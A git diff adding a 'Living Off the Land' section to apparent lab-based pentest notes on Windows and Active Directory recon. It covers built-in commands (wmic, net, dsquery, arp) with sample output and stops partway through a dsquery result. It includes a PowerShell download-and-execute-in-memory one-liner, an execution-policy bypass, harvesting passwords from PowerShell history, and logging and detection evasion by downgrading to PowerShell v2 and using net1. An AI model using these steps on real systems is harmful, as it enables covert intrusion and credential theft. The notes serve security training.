@@ -42,6 +42,34 @@
     - [Shares](#shares)
     - [Snaffler](#snaffler)
     - [BloodHound](#bloodhound)
+  - [Living Off the Land](#living-off-the-land)
+    - [Env Commands for Host \& Network Recon](#env-commands-for-host--network-recon)
+    - [Harnessing PowerShell](#harnessing-powershell)
+      - [Quick Checks](#quick-checks)
+      - [Downgrade PowerShell](#downgrade-powershell)
+    - [Checking Defenses](#checking-defenses)
+      - [Firewall Checks](#firewall-checks)
+      - [Windows Defender Check](#windows-defender-check)
+        - [Get-MpComputerStatus](#get-mpcomputerstatus)
+    - [Am I Alone?](#am-i-alone)
+    - [Network Information](#network-information)
+      - [arp -a](#arp--a)
+      - [route print](#route-print)
+    - [Windows Management Instrumentation (_WMI_)](#windows-management-instrumentation-wmi)
+    - [Net Commands](#net-commands)
+      - [Listing Domain Groups](#listing-domain-groups)
+      - [Information about a Domain User](#information-about-a-domain-user)
+      - [Net Commands Trick](#net-commands-trick)
+    - [Dsquery](#dsquery)
+      - [User Search](#user-search)
+      - [Computer Search](#computer-search)
+      - [Wildcard Search](#wildcard-search)
+      - [Users with specific Attributes Set](#users-with-specific-attributes-set)
+      - [Searching for DCs](#searching-for-dcs)
+      - [LDAP Filtering Explained](#ldap-filtering-explained)
+        - [UAC Values](#uac-values)
+        - [OID match strings](#oid-match-strings)
+        - [Logical Operators](#logical-operators)
 
 ---
 
@@ -1299,3 +1327,653 @@ Closing writers
 ```
 
 Next, you can exfiltrate the dataset to your own VM or ingest it into the BloodHound GUI tool.
+
+## Living Off the Land
+
+### Env Commands for Host & Network Recon
+
+First, a few basic environmental comannds can be used to give you more information about the host you are on.
+
+| Command | Result |
+| ------- | ------ |
+| ```hostname``` | prints the PC's name |
+| ```[System.Environment]::OSVersion.Version``` | prints out the OS version and revision level |
+| ```wmic qfe get Caption,Description,HotFixID,InstalledOn``` | prints the patches and hotfixes applied to the host |
+| ```ipconfig /all``` | prints out network adapter state and config |
+| ```echo %USERDOMAIN%``` | displays the domain name to which the host belongs |
+| ```echo %logonserver%``` | prints out the name of the DC the host checks in with |
+
+The commands above will give you a quick initial picture of the state the host is in, as well as some basic networking and domain information. You can cover the information above with one command ```systeminfo```.
+
+![ad credentialed enum 1](../../../../images/ad_credentialed_enum1.gif)
+
+The ```systeminfo``` command, as seen above, will print a summary of the host's information for you in one tidy output.
+
+> [!TIP]
+> Running one command will generate fewer logs, meaning less of a chance you are noticed on the host by a defender.
+
+### Harnessing PowerShell
+
+#### Quick Checks
+
+PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules you can use on an engagement to recon the host and network and send and receive files.
+
+Some helpful PowerShell cmdlets:
+
+| cmdlet | Description |
+| ------ | ----------- |
+| ```Get-Module``` | lists available modules loaded for use |
+| ```Get-ExecutionPolicy -List``` | will print the execution policy settings for each scope on a host |
+| ```Set-ExecutionPolicy Bypass -Scope Process``` | this will change the policy for your current process using the ```-Scope``` parameter; doing so will revert the policy once you vacate the process or terminate it; this is ideal because you won't be making permanent change to the victim host |
+| ```Get-ChildItem Env: \| ft Key,Value``` | return environment values such as key paths, users, computer information, etc. |
+| ```Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt``` | with this string, you can get the specified user's PowerShell history; this can be quite helpful as the command history may contain passwords or point you towards configuration files or scripts that contain passwords |
+| ```powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"``` | this is a quick and easy way to download a file from the web using PowerShell and call it from memory |
+
+```powershell
+PS C:\htb> Get-Module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
+
+PS C:\htb> Get-ExecutionPolicy -List
+Get-ExecutionPolicy -List
+
+        Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      Process       Undefined
+  CurrentUser       Undefined
+ LocalMachine    RemoteSigned
+
+
+PS C:\htb> whoami
+nt authority\system
+
+PS C:\htb> Get-ChildItem Env: | ft key,value
+
+Get-ChildItem Env: | ft key,value
+
+Key                     Value
+---                     -----
+ALLUSERSPROFILE         C:\ProgramData
+APPDATA                 C:\Windows\system32\config\systemprofile\AppData\Roaming
+CommonProgramFiles      C:\Program Files (x86)\Common Files
+CommonProgramFiles(x86) C:\Program Files (x86)\Common Files
+CommonProgramW6432      C:\Program Files\Common Files
+COMPUTERNAME            ACADEMY-EA-MS01
+ComSpec                 C:\Windows\system32\cmd.exe
+DriverData              C:\Windows\System32\Drivers\DriverData
+LOCALAPPDATA            C:\Windows\system32\config\systemprofile\AppData\Local
+NUMBER_OF_PROCESSORS    4
+OS                      Windows_NT
+Path                    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShel...
+PATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+PROCESSOR_ARCHITECTURE  x86
+PROCESSOR_ARCHITEW6432  AMD64
+PROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+PROCESSOR_LEVEL         23
+PROCESSOR_REVISION      3100
+ProgramData             C:\ProgramData
+ProgramFiles            C:\Program Files (x86)
+ProgramFiles(x86)       C:\Program Files (x86)
+ProgramW6432            C:\Program Files
+PROMPT                  $P$G
+PSModulePath            C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\...
+PUBLIC                  C:\Users\Public
+SystemDrive             C:
+SystemRoot              C:\Windows
+TEMP                    C:\Windows\TEMP
+TMP                     C:\Windows\TEMP
+USERDOMAIN              INLANEFREIGHT
+USERNAME                ACADEMY-EA-MS01$
+USERPROFILE             C:\Windows\system32\config\systemprofile
+windir                  C:\Windows
+```
+
+#### Downgrade PowerShell
+
+Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. PowerShell event logging was introduced with PowerShell 3.0 and forward. With that in mind, you can attempt to call PowerShell version 2.0 or older. If successful, your actions from the shell will not be logged in Event Viewer. This is a great way for you to remain under the defenders' radar while still utilizing resources built into the hosts to your advantage. Below is an example of downgrading PowerShell.
+
+```powershell
+PS C:\htb> Get-host
+
+Name             : ConsoleHost
+Version          : 5.1.19041.1320
+InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
+UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
+CurrentCulture   : en-US
+CurrentUICulture : en-US
+PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
+DebuggerEnabled  : True
+IsRunspacePushed : False
+Runspace         : System.Management.Automation.Runspaces.LocalRunspace
+
+PS C:\htb> powershell.exe -version 2
+Windows PowerShell
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+
+PS C:\htb> Get-host
+Name             : ConsoleHost
+Version          : 2.0
+InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
+UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
+CurrentCulture   : en-US
+CurrentUICulture : en-US
+PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
+IsRunspacePushed : False
+Runspace         : System.Management.Automation.Runspaces.LocalRunspace
+
+PS C:\htb> get-module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
+Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
+```
+
+You can now see that you are running an older version of PowerShell from the output above. Notice the differece in the version reported. It validates you have successfully downgraded the shell. Check and see if you are still writing logs. The primary place to look is in the PowerShell Operational Log found under ```Applications and Services Logs > Microsoft > Windows > PowerShell > Operational```. All commands executed in your session will log to this file. The Windows PowerShell log located at ```Applications and Services Logs > Windows PowerShell``` is also a good place to check. An entry will be made here when you start an instance of PowerShell. In the image below, you can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since your session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.
+
+![ad credentialed enum 2](../../../../images/ad_credentialed_enum2.png)
+
+With Script Blocking Language enabled, you can see that whatever you type into the terminal gets sent to this log. If you downgrade to PowerShell V2, this will no longer function correctly. Your actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that you can see the commands you issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command ```powershell.exe -version 2``` within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. You can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in the green is the text showing a new PowerShell session was started in HostVersion 2.0.
+
+![ad credentialed enum 3](../../../../images/ad_credentialed_enum3.png)
+
+### Checking Defenses
+
+#### Firewall Checks
+
+```powershell
+PS C:\htb> netsh advfirewall show allprofiles
+
+Domain Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Private Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Public Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+```
+
+#### Windows Defender Check
+
+```
+C:\htb> sc query windefend
+
+SERVICE_NAME: windefend
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
+Above, you checked if Defender was running.
+
+##### Get-MpComputerStatus
+
+Below you will check the status and configuration settings.
+
+```powershell
+PS C:\htb> Get-MpComputerStatus
+
+AMEngineVersion                  : 1.1.19000.8
+AMProductVersion                 : 4.18.2202.4
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.2202.4
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 0
+AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
+AntispywareSignatureVersion      : 1.361.414.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 0
+AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
+AntivirusSignatureVersion        : 1.361.414.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+DeviceControlDefaultEnforcement  : Unknown
+DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
+DeviceControlState               : Disabled
+FullScanAge                      : 4294967295
+FullScanEndTime                  :
+FullScanOverdue                  : False
+FullScanRequired                 : False
+FullScanSignatureVersion         :
+FullScanStartTime                :
+IoavProtectionEnabled            : True
+IsTamperProtected                : True
+IsVirtualMachine                 : False
+LastFullScanSource               : 0
+LastQuickScanSource              : 2
+
+<SNIP>
+```
+
+Knowing what revision your AV settings are at and what settings are enabled/disabled can greatly benefit you. You can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.
+
+### Am I Alone?
+
+WHen landing on a host for the first time, one important thing is to check if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and you could lose your foothold.
+
+```powershell
+PS C:\htb> qwinsta
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+ services                                    0  Disc
+>console           forend                    1  Active
+ rdp-tcp                                 65536  Listen
+```
+
+### Network Information
+
+Now that you have a solid feel for the state of your host, you can enumerate the network settings for your host and identify any potential domain machines or services you may want to target next.
+
+| Networking Command | Description |
+| ------------------ | ----------- |
+| ```arp -a``` | lists all known hosts stored in the arp table |
+| ```ipconfig /all``` | prints out adapter settings for the host; you can figure out the network segment from here |
+| ```route print``` | displays the routing table identifying known networks and layer three routes shared with the host |
+| ```netsh advfirewall show allprofiles``` | displays the status of the host's firewall; you can determine if it is active and filtering traffic |
+
+Commands such as ```ipconfig /all``` and ```systeminfo``` show you some basic networking configs. Two more important commands provide you with a ton of valuable data and could help you further your access. ```arp -a``` and ```route print``` will show you what hosts the box you are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be escpecially helpful in the discovery phase of a black box assessment where you have to limit your scanning.
+
+#### arp -a
+
+```powershell
+PS C:\htb> arp -a
+
+Interface: 172.16.5.25 --- 0x8
+  Internet Address      Physical Address      Type
+  172.16.5.5            00-50-56-b9-08-26     dynamic
+  172.16.5.130          00-50-56-b9-f0-e1     dynamic
+  172.16.5.240          00-50-56-b9-9d-66     dynamic
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+Interface: 10.129.201.234 --- 0xc
+  Internet Address      Physical Address      Type
+  10.129.0.1            00-50-56-b9-b9-fc     dynamic
+  10.129.202.29         00-50-56-b9-26-8d     dynamic
+  10.129.255.255        ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static
+```
+
+#### route print
+
+```powershell
+PS C:\htb> route print
+
+===========================================================================
+Interface List
+  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2
+ 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter
+  1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261
+          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20
+       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266
+   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266
+   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261
+      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261
+     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266
+        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266
+  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261
+  ===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0       172.16.5.1  Default
+===========================================================================
+
+IPv6 Route Table
+===========================================================================
+
+<SNIP>
+```
+
+### Windows Management Instrumentation (_WMI_)
+
+... is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts.
+
+| Command | Description |
+| ------- | ----------- |
+| ```wmic qfe get Caption,Description,HotFixID,InstalledOn``` | prints the patch level and description of the Hotfixes applied |
+| ```wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List``` | displays basic host information to include any attributes within the list |
+| ```wmic process list /format:list``` | a listing of all processes on host |
+| ```wmic ntdomain list /format:list``` | displays information about the domain and DCs |
+| ```wmic useraccount list /format:list``` | displays information about all local accounts and any domain accounts that have logged into the device |
+| ```wmic group list /format:list``` | information about all local groups |
+| ```wmic sysaccount list /format:list``` | dumps information about any system accounts that are being used as service accounts |
+
+Below you can see information about the domain and the child domain, and the external forest that your current domain has a trust with. Read this [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4).
+
+```powershell
+PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+
+Caption          Description      DnsForestName           DomainControllerAddress  DomainName
+ACADEMY-EA-MS01  ACADEMY-EA-MS01
+INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
+LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
+FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
+```
+
+### Net Commands
+
+... can be beneficial to you when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. You can list information such as:
+
+- local and domain users
+- groups
+- hosts
+- specific users in groups
+- domain controllers
+- password requirements
+
+Keep in mind that net.exe commands are typically monitored by EDR solutions and can quickly give up your location if your assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as ```whoami```, and ```net localgroup administrators```, etc. This could be an obvious red flag to everyone monitoring the network heavily.
+
+#### Listing Domain Groups
+
+```powershell
+PS C:\htb> net group /domain
+
+The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
+
+Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+-------------------------------------------------------------------------------
+*$H25000-1RTRKC5S507F
+*Accounting
+*Barracuda_all_access
+*Barracuda_facebook_access
+*Barracuda_parked_sites
+*Barracuda_youtube_exempt
+*Billing
+*Billing_users
+*Calendar Access
+*CEO
+*CFO
+*Cloneable Domain Controllers
+*Collaboration_users
+*Communications_users
+*Compliance Management
+*Computer Group Management
+*Contractors
+*CTO
+
+<SNIP>
+```
+
+You can see above the ```net group``` command provided you with a list of groups within the domain.
+
+#### Information about a Domain User
+
+```powershell
+PS C:\htb> net user /domain wrouse
+
+The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
+
+User name                    wrouse
+Full Name                    Christopher Davis
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/27/2021 10:38:01 AM
+Password expires             Never
+Password changeable          10/28/2021 10:38:01 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *File Share G Drive   *File Share H Drive
+                             *Warehouse            *Printer Access
+                             *Domain Users         *VPN Users
+                             *Shared Calendar Read
+The command completed successfully.
+```
+
+#### Net Commands Trick
+
+If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing ```net1``` instead of ```net``` will execute the same functions without the potential trigger from the net string.
+
+### Dsquery
+
+... is a helpful command-line tool that can be utilized to find AD objects. The queries you run with this tool can be easily replicated with tools like BloodHound and PowerView, but you may not always have those tools at your disposal. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the AD Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at ```C:\Windows\System32\dsquery.dll```.
+
+All you need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, there is the basic search function with dsquery and a few helpful search filters.
+
+#### User Search
+
+```powershell
+PS C:\htb> dsquery user
+
+"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+```
+
+#### Computer Search
+
+```powershell
+PS C:\htb> dsquery computer
+
+"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
+```
+
+#### Wildcard Search
+
+You can use a dsquery wildcard search to view all objects in an OU, for example.
+
+```powershell
+PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+<SNIP>
+```
+
+#### Users with specific Attributes Set
+
+You can, of course, combine dsquery with LDAP search filters of your choosing. The below looks for users with the PASSWD_NOTREQD flag set int userAccountControl attribute.
+
+```powershell
+PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+  distinguishedName                                                                              userAccountControl
